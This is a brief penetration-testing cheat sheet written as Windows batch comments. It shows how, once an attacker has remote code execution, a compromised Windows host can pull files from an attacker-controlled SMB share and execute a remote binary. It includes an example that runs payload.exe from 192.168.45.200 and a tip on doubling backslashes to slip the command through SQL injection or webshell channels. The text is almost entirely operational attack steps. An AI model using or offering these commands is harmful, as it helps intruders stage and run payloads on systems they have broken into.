:: If we have a SMB server and RCE on a Windows hosts, we can transfer a file with the following command:

C:\>net use \\<IP>\<SMBShareName> ::This will connect to the SMB share.

:: Once we are connected to the SMB share we can copy a file with the following command:

:: --> Copy a file inside the system.

	C:\>cmd.exe copy \\<IP>\<SMBShareName>\<filename> <outfile>

:: --> Execute remote binary.

	C:\>cmd.exe /c \\<IP>\<SMBShareNmae>\<filename>

:: In some circustances (for example when we have RCE through some service SQLi, WebShell, etc) it could be necesary to add double backslash in order to bypass the service engine parse of the payload.
:: And example could be: cmd.exe /c \\\\192.168.45.200\\smb\\payload.exe
